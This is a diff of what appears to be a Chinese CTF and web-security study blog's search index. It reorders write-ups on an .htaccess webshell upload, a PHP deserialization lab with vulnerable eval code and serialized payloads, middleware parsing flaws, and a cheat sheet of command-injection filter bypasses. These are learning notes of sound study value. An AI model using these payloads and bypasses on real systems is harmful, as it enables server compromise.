@@ -699,6 +699,42 @@
       </tags>
   </entry>
   <entry>
+    <title>gaps安装</title>
+    <url>/2023/01/07/gaps%E5%AE%89%E8%A3%85/</url>
+    <content><![CDATA[<p>看了很多教程最后花了几个小时装了下来，记录一下。</p>
+<span id="more"></span>
+
+<p>下载命令</p>
+<p>git clone <a href="https://github.com/nemanja-m/gaps.git">https://github.com/nemanja-m/gaps.git</a> #gaps官网</p>
+<p>cd gaps</p>
+<p>pip install -r requirements.txt</p>
+<p>sudo apt-get install python-tk</p>
+<p>pip install -e .</p>
+<p>我的kali进不了github所以我在windows下将gaps包挪到了kali中。</p>
+<p>命令行中输入gaps即可在kali中下载。</p>
+<p>下载后使用命令</p>
+<p>sudo apt-get install python3-pillow</p>
+<p>sudo apt-get install python3-numpy</p>
+<p>sudo apt-get install python3-opencv-python </p>
+<p>sudo apt-get install python3-pytest</p>
+<p>sudo apt-get install python3-matplotlib</p>
+<p>然后查看requirements.txt</p>
+<p><img src="/2023/01/07/gaps%E5%AE%89%E8%A3%85/1668417498906-713dabb9-3fbd-4540-880d-815a3c3aa501.png" alt="img"></p>
+<p>对应的各自版本号，不同则修改</p>
+<p><img src="/2023/01/07/gaps%E5%AE%89%E8%A3%85/1668417561551-f1c02b9e-7de4-4d1c-8416-4ff674cc220d.png" alt="img"></p>
+<p>括号内的就是版本号</p>
+<p>最后使用命令pip3 install -e .</p>
+<p><img src="/2023/01/07/gaps%E5%AE%89%E8%A3%85/1668417638964-4c8641f7-0894-4e6c-bfa4-e3da6cc51f75.png" alt="img"></p>
+<p>出现以上内容安装成功。</p>
+]]></content>
+      <categories>
+        <category>ctf工具</category>
+      </categories>
+      <tags>
+        <tag>ctf</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>easy_md5(复现)</title>
     <url>/2023/01/07/easy-md5-%E5%A4%8D%E7%8E%B0/</url>
     <content><![CDATA[<p><img src="/2023/01/07/easy-md5-%E5%A4%8D%E7%8E%B0/1670938628105-3d90a17a-a99f-44be-8f72-5ef78a5a15f2.png" alt="img"></p>
@@ -751,39 +787,37 @@
       </tags>
   </entry>
   <entry>
-    <title>gaps安装</title>
-    <url>/2023/01/07/gaps%E5%AE%89%E8%A3%85/</url>
-    <content><![CDATA[<p>看了很多教程最后花了几个小时装了下来，记录一下。</p>
+    <title>(.htaccess+script)[GXYCTF2019]BabyUpload</title>
+    <url>/2023/01/07/htaccess-script-GXYCTF2019-BabyUpload/</url>
+    <content><![CDATA[<p><img src="/2023/01/07/htaccess-script-GXYCTF2019-BabyUpload/1672731946450-102dae86-780f-4b7a-8222-21b24dd58230.png" alt="img"></p>
 <span id="more"></span>
 
-<p>下载命令</p>
-<p>git clone <a href="https://github.com/nemanja-m/gaps.git">https://github.com/nemanja-m/gaps.git</a> #gaps官网</p>
-<p>cd gaps</p>
-<p>pip install -r requirements.txt</p>
-<p>sudo apt-get install python-tk</p>
-<p>pip install -e .</p>
-<p>我的kali进不了github所以我在windows下将gaps包挪到了kali中。</p>
-<p>命令行中输入gaps即可在kali中下载。</p>
-<p>下载后使用命令</p>
-<p>sudo apt-get install python3-pillow</p>
-<p>sudo apt-get install python3-numpy</p>
-<p>sudo apt-get install python3-opencv-python </p>
-<p>sudo apt-get install python3-pytest</p>
-<p>sudo apt-get install python3-matplotlib</p>
-<p>然后查看requirements.txt</p>
-<p><img src="/2023/01/07/gaps%E5%AE%89%E8%A3%85/1668417498906-713dabb9-3fbd-4540-880d-815a3c3aa501.png" alt="img"></p>
-<p>对应的各自版本号，不同则修改</p>
-<p><img src="/2023/01/07/gaps%E5%AE%89%E8%A3%85/1668417561551-f1c02b9e-7de4-4d1c-8416-4ff674cc220d.png" alt="img"></p>
-<p>括号内的就是版本号</p>
-<p>最后使用命令pip3 install -e .</p>
-<p><img src="/2023/01/07/gaps%E5%AE%89%E8%A3%85/1668417638964-4c8641f7-0894-4e6c-bfa4-e3da6cc51f75.png" alt="img"></p>
-<p>出现以上内容安装成功。</p>
+<p><img src="/2023/01/07/htaccess-script-GXYCTF2019-BabyUpload/1672731960615-14bf03ed-53af-4ccb-86e1-754fb3f36799.png" alt="img"></p>
+<p>1.上传php文件</p>
+<p><img src="/2023/01/07/htaccess-script-GXYCTF2019-BabyUpload/1672731991227-e3ce0e92-9489-4942-a1c8-e72c3bfd6d03.png" alt="img"></p>
+<p>可见有后缀名过滤</p>
+<p>2.上传jpg文件</p>
+<p><img src="/2023/01/07/htaccess-script-GXYCTF2019-BabyUpload/1672732037682-6084f936-f4e2-4a02-9294-e9c8d62162cd.png" alt="img"></p>
+<p>可见对文件内容为&lt;?可能有过滤</p>
+<p>3.上传.htaccess文件</p>
+<p><img src="/2023/01/07/htaccess-script-GXYCTF2019-BabyUpload/1672732095861-09069902-ef31-4645-ab56-db23820b48fe.png" alt="img"></p>
+<p>经过分析，是mime类型过滤</p>
+<p>将mime类型改为image/jpeg即可</p>
+<p><img src="/2023/01/07/htaccess-script-GXYCTF2019-BabyUpload/1672732206598-0ea5576d-0923-4721-b3dd-ce9694c0b642.png" alt="img"></p>
+<p>AddType application/x-httpd-php .jpg</p>
+<p>这句话的意思是将jpg文件后缀解析为php文件</p>
+<p>4.传🐎</p>
+<p><img src="/2023/01/07/htaccess-script-GXYCTF2019-BabyUpload/1672732328192-ada01c3d-260b-40f2-bb47-09e90cc15fbe.png" alt="img"></p>
+<p><img src="/2023/01/07/htaccess-script-GXYCTF2019-BabyUpload/1672732337448-2482057a-0460-4657-bdb6-2a36ca8c0b09.png" alt="img"></p>
+<p><img src="/2023/01/07/htaccess-script-GXYCTF2019-BabyUpload/1672732383108-234defa1-ea71-4295-8e68-2528bc5fb9e4.png" alt="img"></p>
+<p>5.getshell</p>
+<p><img src="/2023/01/07/htaccess-script-GXYCTF2019-BabyUpload/1672732456086-1aa5e05f-4369-4123-90f1-6ffabc518d3c.png" alt="img"></p>
 ]]></content>
       <categories>
-        <category>ctf工具</category>
+        <category>文件上传</category>
       </categories>
       <tags>
-        <tag>ctf</tag>
+        <tag>web漏洞</tag>
       </tags>
   </entry>
   <entry>
@@ -817,40 +851,6 @@
 ]]></content>
       <categories>
         <category>SQL注入</category>
-      </categories>
-      <tags>
-        <tag>web漏洞</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>(.htaccess+script)[GXYCTF2019]BabyUpload</title>
-    <url>/2023/01/07/htaccess-script-GXYCTF2019-BabyUpload/</url>
-    <content><![CDATA[<p><img src="/2023/01/07/htaccess-script-GXYCTF2019-BabyUpload/1672731946450-102dae86-780f-4b7a-8222-21b24dd58230.png" alt="img"></p>
-<span id="more"></span>
-
-<p><img src="/2023/01/07/htaccess-script-GXYCTF2019-BabyUpload/1672731960615-14bf03ed-53af-4ccb-86e1-754fb3f36799.png" alt="img"></p>
-<p>1.上传php文件</p>
-<p><img src="/2023/01/07/htaccess-script-GXYCTF2019-BabyUpload/1672731991227-e3ce0e92-9489-4942-a1c8-e72c3bfd6d03.png" alt="img"></p>
-<p>可见有后缀名过滤</p>
-<p>2.上传jpg文件</p>
-<p><img src="/2023/01/07/htaccess-script-GXYCTF2019-BabyUpload/1672732037682-6084f936-f4e2-4a02-9294-e9c8d62162cd.png" alt="img"></p>
-<p>可见对文件内容为&lt;?可能有过滤</p>
-<p>3.上传.htaccess文件</p>
-<p><img src="/2023/01/07/htaccess-script-GXYCTF2019-BabyUpload/1672732095861-09069902-ef31-4645-ab56-db23820b48fe.png" alt="img"></p>
-<p>经过分析，是mime类型过滤</p>
-<p>将mime类型改为image/jpeg即可</p>
-<p><img src="/2023/01/07/htaccess-script-GXYCTF2019-BabyUpload/1672732206598-0ea5576d-0923-4721-b3dd-ce9694c0b642.png" alt="img"></p>
-<p>AddType application/x-httpd-php .jpg</p>
-<p>这句话的意思是将jpg文件后缀解析为php文件</p>
-<p>4.传🐎</p>
-<p><img src="/2023/01/07/htaccess-script-GXYCTF2019-BabyUpload/1672732328192-ada01c3d-260b-40f2-bb47-09e90cc15fbe.png" alt="img"></p>
-<p><img src="/2023/01/07/htaccess-script-GXYCTF2019-BabyUpload/1672732337448-2482057a-0460-4657-bdb6-2a36ca8c0b09.png" alt="img"></p>
-<p><img src="/2023/01/07/htaccess-script-GXYCTF2019-BabyUpload/1672732383108-234defa1-ea71-4295-8e68-2528bc5fb9e4.png" alt="img"></p>
-<p>5.getshell</p>
-<p><img src="/2023/01/07/htaccess-script-GXYCTF2019-BabyUpload/1672732456086-1aa5e05f-4369-4123-90f1-6ffabc518d3c.png" alt="img"></p>
-]]></content>
-      <categories>
-        <category>文件上传</category>
       </categories>
       <tags>
         <tag>web漏洞</tag>
@@ -918,37 +918,6 @@
       </tags>
   </entry>
   <entry>
-    <title>php-SER-libs反序列化靶场</title>
-    <url>/2023/01/07/php-SER-libs%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%9D%B6%E5%9C%BA/</url>
-    <content><![CDATA[<h3 id="level1"><a href="#level1" class="headerlink" title="level1"></a>level1</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">include(&quot;flag.php&quot;);</span><br><span class="line">class a&#123;</span><br><span class="line">    var $act;</span><br><span class="line">    function action()&#123;</span><br><span class="line">        eval($this-&gt;act);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a=unserialize($_GET[&#x27;flag&#x27;]);</span><br><span class="line">$a-&gt;action();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<span id="more"></span>
-
-<p>构造类的实例化</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class a&#123;</span><br><span class="line">    var $act;</span><br><span class="line">    function action()&#123;</span><br><span class="line">        eval($this-&gt;act);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a=new a();</span><br><span class="line">$a-&gt;act=&quot;show_source(&#x27;flag.php&#x27;);&quot;;</span><br><span class="line">echo serialize($a);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<h3 id="level2"><a href="#level2" class="headerlink" title="level2"></a>level2</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">include(&quot;flag.php&quot;);</span><br><span class="line">class mylogin&#123;</span><br><span class="line">    var $user;</span><br><span class="line">    var $pass;</span><br><span class="line">    function __construct($user,$pass)&#123;</span><br><span class="line">        $this-&gt;user=$user;</span><br><span class="line">        $this-&gt;pass=$pass;</span><br><span class="line">    &#125;</span><br><span class="line">    function login()&#123;</span><br><span class="line">        if ($this-&gt;user==&quot;daydream&quot; and $this-&gt;pass==&quot;ok&quot;)&#123;</span><br><span class="line">            return 1;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a=unserialize($_GET[&#x27;param&#x27;]);</span><br><span class="line">if($a-&gt;login())</span><br><span class="line">&#123;</span><br><span class="line">    echo $flag;</span><br><span class="line">&#125;</span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure>
-
-<p>看代码的意思$a-&gt;login()为真时，输出flag</p>
-<p>也就是uesr=daydream   pass=ok</p>
-<p>构造</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">include(&quot;flag.php&quot;);</span><br><span class="line">class mylogin&#123;</span><br><span class="line">    var $user;</span><br><span class="line">    var $pass;</span><br><span class="line">    function __construct($user,$pass)&#123;</span><br><span class="line">        $this-&gt;user=$user;</span><br><span class="line">        $this-&gt;pass=$pass;</span><br><span class="line">    &#125;</span><br><span class="line">    function login()&#123;</span><br><span class="line">        if ($this-&gt;user==&quot;daydream&quot; and $this-&gt;pass==&quot;ok&quot;)&#123;</span><br><span class="line">            return 1;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">//</span><br><span class="line">$aa=new mylogin();</span><br><span class="line">$aa-&gt;user=&quot;daydream&quot;;</span><br><span class="line">$aa-&gt;pass=&quot;ok&quot;;</span><br><span class="line">$s=serialize($aa);</span><br><span class="line">print_r()</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<p>payload</p>
-<p>?param=O:7:”mylogin”:2:{s:4:”user”;s:8:”daydream”;s:4:”pass”;s:2:”ok”;}</p>
-<h3 id="level3"><a href="#level3" class="headerlink" title="level3"></a>level3</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">include(&quot;flag.php&quot;);</span><br><span class="line">class mylogin&#123;</span><br><span class="line">    var $user;</span><br><span class="line">    var $pass;</span><br><span class="line">    function __construct($user,$pass)&#123;</span><br><span class="line">        $this-&gt;user=$user;</span><br><span class="line">        $this-&gt;pass=$pass;</span><br><span class="line">    &#125;</span><br><span class="line">    function login()&#123;</span><br><span class="line">        if ($this-&gt;user==&quot;daydream&quot; and $this-&gt;pass==&quot;ok&quot;)&#123;</span><br><span class="line">            return 1;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a=unserialize($_COOKIE[&#x27;param&#x27;]);</span><br><span class="line">if($a-&gt;login())</span><br><span class="line">&#123;</span><br><span class="line">    echo $flag;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<p>和上一题的payload一样，不过把param后面的值进行url编码</p>
-<p>![img]1671089842139-0a4d683f-f080-41bb-a5dd-22e61914c88e.png)</p>
-]]></content>
-      <categories>
-        <category>反序列化</category>
-      </categories>
-      <tags>
-        <tag>靶场</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>(phar伪协议上传webshell)[NISACTF 2022]bingdundun~</title>
     <url>/2023/01/07/phar%E4%BC%AA%E5%8D%8F%E8%AE%AE%E4%B8%8A%E4%BC%A0webshell-NISACTF-2022-bingdundun/</url>
     <content><![CDATA[<p><img src="/2023/01/07/phar%E4%BC%AA%E5%8D%8F%E8%AE%AE%E4%B8%8A%E4%BC%A0webshell-NISACTF-2022-bingdundun/1671152984224-93f6d96f-3aee-45d6-b849-6d2ee1f3428c.png" alt="img"></p>
@@ -990,6 +959,37 @@
       </categories>
       <tags>
         <tag>web漏洞</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>php-SER-libs反序列化靶场</title>
+    <url>/2023/01/07/php-SER-libs%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%9D%B6%E5%9C%BA/</url>
+    <content><![CDATA[<h3 id="level1"><a href="#level1" class="headerlink" title="level1"></a>level1</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">include(&quot;flag.php&quot;);</span><br><span class="line">class a&#123;</span><br><span class="line">    var $act;</span><br><span class="line">    function action()&#123;</span><br><span class="line">        eval($this-&gt;act);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a=unserialize($_GET[&#x27;flag&#x27;]);</span><br><span class="line">$a-&gt;action();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<span id="more"></span>
+
+<p>构造类的实例化</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class a&#123;</span><br><span class="line">    var $act;</span><br><span class="line">    function action()&#123;</span><br><span class="line">        eval($this-&gt;act);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a=new a();</span><br><span class="line">$a-&gt;act=&quot;show_source(&#x27;flag.php&#x27;);&quot;;</span><br><span class="line">echo serialize($a);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="level2"><a href="#level2" class="headerlink" title="level2"></a>level2</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">include(&quot;flag.php&quot;);</span><br><span class="line">class mylogin&#123;</span><br><span class="line">    var $user;</span><br><span class="line">    var $pass;</span><br><span class="line">    function __construct($user,$pass)&#123;</span><br><span class="line">        $this-&gt;user=$user;</span><br><span class="line">        $this-&gt;pass=$pass;</span><br><span class="line">    &#125;</span><br><span class="line">    function login()&#123;</span><br><span class="line">        if ($this-&gt;user==&quot;daydream&quot; and $this-&gt;pass==&quot;ok&quot;)&#123;</span><br><span class="line">            return 1;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a=unserialize($_GET[&#x27;param&#x27;]);</span><br><span class="line">if($a-&gt;login())</span><br><span class="line">&#123;</span><br><span class="line">    echo $flag;</span><br><span class="line">&#125;</span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure>
+
+<p>看代码的意思$a-&gt;login()为真时，输出flag</p>
+<p>也就是uesr=daydream   pass=ok</p>
+<p>构造</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">include(&quot;flag.php&quot;);</span><br><span class="line">class mylogin&#123;</span><br><span class="line">    var $user;</span><br><span class="line">    var $pass;</span><br><span class="line">    function __construct($user,$pass)&#123;</span><br><span class="line">        $this-&gt;user=$user;</span><br><span class="line">        $this-&gt;pass=$pass;</span><br><span class="line">    &#125;</span><br><span class="line">    function login()&#123;</span><br><span class="line">        if ($this-&gt;user==&quot;daydream&quot; and $this-&gt;pass==&quot;ok&quot;)&#123;</span><br><span class="line">            return 1;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">//</span><br><span class="line">$aa=new mylogin();</span><br><span class="line">$aa-&gt;user=&quot;daydream&quot;;</span><br><span class="line">$aa-&gt;pass=&quot;ok&quot;;</span><br><span class="line">$s=serialize($aa);</span><br><span class="line">print_r()</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>payload</p>
+<p>?param=O:7:”mylogin”:2:{s:4:”user”;s:8:”daydream”;s:4:”pass”;s:2:”ok”;}</p>
+<h3 id="level3"><a href="#level3" class="headerlink" title="level3"></a>level3</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">include(&quot;flag.php&quot;);</span><br><span class="line">class mylogin&#123;</span><br><span class="line">    var $user;</span><br><span class="line">    var $pass;</span><br><span class="line">    function __construct($user,$pass)&#123;</span><br><span class="line">        $this-&gt;user=$user;</span><br><span class="line">        $this-&gt;pass=$pass;</span><br><span class="line">    &#125;</span><br><span class="line">    function login()&#123;</span><br><span class="line">        if ($this-&gt;user==&quot;daydream&quot; and $this-&gt;pass==&quot;ok&quot;)&#123;</span><br><span class="line">            return 1;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a=unserialize($_COOKIE[&#x27;param&#x27;]);</span><br><span class="line">if($a-&gt;login())</span><br><span class="line">&#123;</span><br><span class="line">    echo $flag;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>和上一题的payload一样，不过把param后面的值进行url编码</p>
+<p>![img]1671089842139-0a4d683f-f080-41bb-a5dd-22e61914c88e.png)</p>
+]]></content>
+      <categories>
+        <category>反序列化</category>
+      </categories>
+      <tags>
+        <tag>靶场</tag>
       </tags>
   </entry>
   <entry>
@@ -1309,26 +1309,6 @@ https://blog.csdn.net/weixin_39190897/article/details/85334893]]></content>
       </tags>
   </entry>
   <entry>
-    <title>中间件解析漏洞</title>
-    <url>/2023/01/07/%E4%B8%AD%E9%97%B4%E4%BB%B6%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/</url>
-    <content><![CDATA[<h1 id="中间件解析漏洞"><a href="#中间件解析漏洞" class="headerlink" title="中间件解析漏洞"></a>中间件解析漏洞</h1><h2 id="apache解析漏洞"><a href="#apache解析漏洞" class="headerlink" title="apache解析漏洞"></a>apache解析漏洞</h2><p><img src="/2023/01/07/%E4%B8%AD%E9%97%B4%E4%BB%B6%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/1672991978769-39972392-a80a-4411-9353-09781546a0ef.png" alt="img"></p>
-<span id="more"></span>
-
-<p><img src="/2023/01/07/%E4%B8%AD%E9%97%B4%E4%BB%B6%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/1672991990540-ee07383b-fc4d-48f2-812e-714f3bb36f42.png" alt="img"></p>
-<p><img src="/2023/01/07/%E4%B8%AD%E9%97%B4%E4%BB%B6%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/1672992001298-b4969176-ee94-4d68-97de-1e8413905d54.png" alt="img"></p>
-<h2 id="nginx解析漏洞"><a href="#nginx解析漏洞" class="headerlink" title="nginx解析漏洞"></a>nginx解析漏洞</h2><p><img src="/2023/01/07/%E4%B8%AD%E9%97%B4%E4%BB%B6%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/1672992030577-44b73883-b1ea-4812-9ef9-2b18001c978e.png" alt="img"></p>
-<p><img src="/2023/01/07/%E4%B8%AD%E9%97%B4%E4%BB%B6%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/1672992045955-6c942af6-38a0-47c4-a2d6-01e84c5242ea.png" alt="img"></p>
-<p><img src="/2023/01/07/%E4%B8%AD%E9%97%B4%E4%BB%B6%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/1672992058788-e44e178e-4e7a-42ac-8ad8-4446041a8d05.png" alt="img"></p>
-<h2 id="iis解析漏洞"><a href="#iis解析漏洞" class="headerlink" title="iis解析漏洞"></a>iis解析漏洞</h2><p><img src="/2023/01/07/%E4%B8%AD%E9%97%B4%E4%BB%B6%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/1672992101004-31965220-7e77-4bd8-a969-cca485f4141b.png" alt="img"></p>
-]]></content>
-      <categories>
-        <category>文件上传</category>
-      </categories>
-      <tags>
-        <tag>web漏洞</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>命令执行绕过总结</title>
     <url>/2023/01/07/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%BB%95%E8%BF%87%E6%80%BB%E7%BB%93/</url>
     <content><![CDATA[<p>  <img src="https://g.csdnimg.cn/static/logo/favicon32.ico" alt="img"><a href="https://blog.csdn.net/qq_44110340/article/details/107532395">命令执行绕过总结_半只特立独行的猪的博客-CSDN博客_命令执行绕过</a> </p>
@@ -1344,6 +1324,26 @@ https://blog.csdn.net/weixin_39190897/article/details/85334893]]></content>
 ]]></content>
       <categories>
         <category>命令执行</category>
+      </categories>
+      <tags>
+        <tag>web漏洞</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>中间件解析漏洞</title>
+    <url>/2023/01/07/%E4%B8%AD%E9%97%B4%E4%BB%B6%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/</url>
+    <content><![CDATA[<h1 id="中间件解析漏洞"><a href="#中间件解析漏洞" class="headerlink" title="中间件解析漏洞"></a>中间件解析漏洞</h1><h2 id="apache解析漏洞"><a href="#apache解析漏洞" class="headerlink" title="apache解析漏洞"></a>apache解析漏洞</h2><p><img src="/2023/01/07/%E4%B8%AD%E9%97%B4%E4%BB%B6%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/1672991978769-39972392-a80a-4411-9353-09781546a0ef.png" alt="img"></p>
+<span id="more"></span>
+
+<p><img src="/2023/01/07/%E4%B8%AD%E9%97%B4%E4%BB%B6%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/1672991990540-ee07383b-fc4d-48f2-812e-714f3bb36f42.png" alt="img"></p>
+<p><img src="/2023/01/07/%E4%B8%AD%E9%97%B4%E4%BB%B6%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/1672992001298-b4969176-ee94-4d68-97de-1e8413905d54.png" alt="img"></p>
+<h2 id="nginx解析漏洞"><a href="#nginx解析漏洞" class="headerlink" title="nginx解析漏洞"></a>nginx解析漏洞</h2><p><img src="/2023/01/07/%E4%B8%AD%E9%97%B4%E4%BB%B6%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/1672992030577-44b73883-b1ea-4812-9ef9-2b18001c978e.png" alt="img"></p>
+<p><img src="/2023/01/07/%E4%B8%AD%E9%97%B4%E4%BB%B6%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/1672992045955-6c942af6-38a0-47c4-a2d6-01e84c5242ea.png" alt="img"></p>
+<p><img src="/2023/01/07/%E4%B8%AD%E9%97%B4%E4%BB%B6%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/1672992058788-e44e178e-4e7a-42ac-8ad8-4446041a8d05.png" alt="img"></p>
+<h2 id="iis解析漏洞"><a href="#iis解析漏洞" class="headerlink" title="iis解析漏洞"></a>iis解析漏洞</h2><p><img src="/2023/01/07/%E4%B8%AD%E9%97%B4%E4%BB%B6%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/1672992101004-31965220-7e77-4bd8-a969-cca485f4141b.png" alt="img"></p>
+]]></content>
+      <categories>
+        <category>文件上传</category>
       </categories>
       <tags>
         <tag>web漏洞</tag>
@@ -2162,6 +2162,25 @@ include('files/'.$action.'.php'); //载入相应文件
       </tags>
   </entry>
   <entry>
+    <title>网安基础总结五</title>
+    <url>/2022/07/17/%E7%BD%91%E5%AE%89%E5%9F%BA%E7%A1%80%E6%80%BB%E7%BB%93%E4%BA%94/</url>
+    <content><![CDATA[<h1 id="rce-远程命令-代码执行漏洞"><a href="#rce-远程命令-代码执行漏洞" class="headerlink" title="rce 远程命令/代码执行漏洞"></a>rce 远程命令/代码执行漏洞</h1><h5 id="反引号"><a href="#反引号" class="headerlink" title="反引号``"></a>反引号``</h5><p>反引号即命令替换 是指Shell可以先执行中的命令，将输出结果暂时保存，在适当的地方输出。</p>
+<span id="more"></span>
+
+<h5 id="单引号，双引号"><a href="#单引号，双引号" class="headerlink" title="单引号，双引号"></a>单引号，双引号</h5><p>适用条件:过滤了字符串<br>放在shell命令中，绕过正则匹配且不影响原意</p>
+<h5 id="空格绕过"><a href="#空格绕过" class="headerlink" title="空格绕过"></a>空格绕过</h5><p>&lt; &lt;&gt; 重定向符<br>%09(需要php环境)<br>${IFS}<br>$IFS$9<br>{cat,flag.php} //用逗号实现了空格功能<br>%20<br>%09</p>
+<h5 id="读文件绕过-cat绕过"><a href="#读文件绕过-cat绕过" class="headerlink" title="读文件绕过(cat绕过)"></a>读文件绕过(cat绕过)</h5><p>适用条件:过滤了cat<br>1)more:一页一页的显示档案内容<br>(2)less:与 more 类似，但是比 more 更好的是，他可以[pg dn][pg up]翻页<br>(3)head:查看头几行<br>(4)tac:从最后一行开始显示，可以看出 tac 是 cat 的反向显示<br>(5)tail:查看尾几行<br>(6)nl：显示的时候，顺便输出行号<br>(7)od:以二进制的方式读取档案内容<br>(8)vi:一种编辑器，这个也可以查看<br>(9)vim:一种编辑器，这个也可以查看<br>(10)sort:可以查看<br>(11)uniq:可以查看<br>(12)file -f:报错出具体内容<br>grep grep test *file #在当前目录中，查找后缀有 file 字样的文件中包含 test 字符串的文件，并打印出该字符串的行</p>
+<h5 id="linux通配符绕过"><a href="#linux通配符绕过" class="headerlink" title="linux通配符绕过"></a>linux通配符绕过</h5><p>适用条件:过滤了flag，没有过滤 ? *<br>在linux系统中 有一些通配符</p>
+<p>匹配任何字符串／文本，包括空字符串；*代表任意字符（0个或多个） ls file *<br>? 匹配任何一个字符（不在括号内时）?代表任意1个字符 ls file 0<br>[abcd] 匹配abcd中任何一个字符<br>[a-z] 表示范围a到z，表示范围的意思 []匹配中括号中任意一个字符 ls file 0</p>
+]]></content>
+      <categories>
+        <category>网安基础篇</category>
+      </categories>
+      <tags>
+        <tag>web基础</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>网安基础总结二</title>
     <url>/2022/05/01/%E7%BD%91%E5%AE%89%E5%9F%BA%E7%A1%80%E6%80%BB%E7%BB%93%E4%BA%8C/</url>
     <content><![CDATA[<p><strong>本周重点</strong></p>
@@ -2285,25 +2304,6 @@ include('files/'.$action.'.php'); //载入相应文件
 <ul>
 <li><strong>注：平常安装的burp suite只能抓取   http://   不能抓取   https://</strong></li>
 </ul>
-]]></content>
-      <categories>
-        <category>网安基础篇</category>
-      </categories>
-      <tags>
-        <tag>web基础</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>网安基础总结五</title>
-    <url>/2022/07/17/%E7%BD%91%E5%AE%89%E5%9F%BA%E7%A1%80%E6%80%BB%E7%BB%93%E4%BA%94/</url>
-    <content><![CDATA[<h1 id="rce-远程命令-代码执行漏洞"><a href="#rce-远程命令-代码执行漏洞" class="headerlink" title="rce 远程命令/代码执行漏洞"></a>rce 远程命令/代码执行漏洞</h1><h5 id="反引号"><a href="#反引号" class="headerlink" title="反引号``"></a>反引号``</h5><p>反引号即命令替换 是指Shell可以先执行中的命令，将输出结果暂时保存，在适当的地方输出。</p>
-<span id="more"></span>
-
-<h5 id="单引号，双引号"><a href="#单引号，双引号" class="headerlink" title="单引号，双引号"></a>单引号，双引号</h5><p>适用条件:过滤了字符串<br>放在shell命令中，绕过正则匹配且不影响原意</p>
